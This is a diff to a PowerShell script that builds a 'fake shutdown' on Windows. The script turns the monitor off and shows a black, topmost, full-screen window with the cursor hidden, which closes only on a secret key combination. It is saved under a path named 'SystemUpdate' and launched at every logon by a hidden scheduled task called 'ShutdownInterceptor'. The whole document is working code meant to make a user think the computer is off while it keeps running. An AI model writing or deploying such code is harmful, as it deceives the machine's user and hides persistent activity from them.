@@ -2,45 +2,45 @@
 # Much simpler approach using slideshow + monitor off
 
 # Create black screen script
-$blackScreenScript = @'
+$blackScreenScript = @"
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -Assembly PresentationFramework
 
 # Turn off monitor
-$code = @'
+`$code = @'
 [DllImport("user32.dll")]
 public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
 '@
-$type = Add-Type -MemberDefinition $code -Name PowerMonitor -Namespace Win32 -PassThru
-$type::SendMessage(0xFFFF, 0x0112, 0xF170, 2)
+`$type = Add-Type -MemberDefinition `$code -Name PowerMonitor -Namespace Win32 -PassThru
+`$type::SendMessage(0xFFFF, 0x0112, 0xF170, 2)
 
 # Create fullscreen black window
-[xml]$xaml = @"
-<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-        WindowState="Maximized"
-        WindowStyle="None"
-        Topmost="True"
-        Background="Black"
-        ShowInTaskbar="False"
-        Cursor="None">
+[xml]`$xaml = @``"
+<Window xmlns=``"http://schemas.microsoft.com/winfx/2006/xaml/presentation``"
+        WindowState=``"Maximized``"
+        WindowStyle=``"None``"
+        Topmost=``"True``"
+        Background=``"Black``"
+        ShowInTaskbar=``"False``"
+        Cursor=``"None``">
 </Window>
-"@
+``"@
 
-$reader = New-Object System.Xml.XmlNodeReader($xaml)
-$window = [Windows.Markup.XamlReader]::Load($reader)
+`$reader = New-Object System.Xml.XmlNodeReader(`$xaml)
+`$window = [Windows.Markup.XamlReader]::Load(`$reader)
 
 # Secret key to close: Ctrl+Alt+Shift+F12
-$window.Add_KeyDown({
-    if ($_.Key -eq 'F12' -and 
+`$window.Add_KeyDown({
+    if (`$_.Key -eq 'F12' -and 
         [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl) -and
         [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftAlt) -and
         [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftShift)) {
-        $window.Close()
+        `$window.Close()
     }
 })
 
-$window.ShowDialog() | Out-Null
-'@
+`$window.ShowDialog() | Out-Null
+"@
 
 $scriptPath = "C:\ProgramData\SystemUpdate\FakeShutdown.ps1"
 $scriptDir = Split-Path $scriptPath
@@ -100,21 +100,8 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowSt
 $trigger = New-ScheduledTaskTrigger -AtLogOn  # Run at logon to intercept
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
 
-# Create shutdown event task
-$cimTrigger = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
-$trigger2 = New-CimInstance -CimClass $cimTrigger -ClientOnly
-$trigger2.Subscription = @"
-<QueryList>
-  <Query Id="0" Path="System">
-    <Select Path="System">
-      *[System[Provider[@Name='User32'] and (EventID=1074)]]
-    </Select>
-  </Query>
-</QueryList>
-"@
-$trigger2.Enabled = $true
-
-Register-ScheduledTask -TaskName "ShutdownInterceptor" -Action $action -Settings $settings -Force -ErrorAction SilentlyContinue
+# Create shutdown interceptor task (simpler approach - just run at logon)
+Register-ScheduledTask -TaskName "ShutdownInterceptor" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue
 
 Write-Output "Fake shutdown configured!"
 Write-Output ""
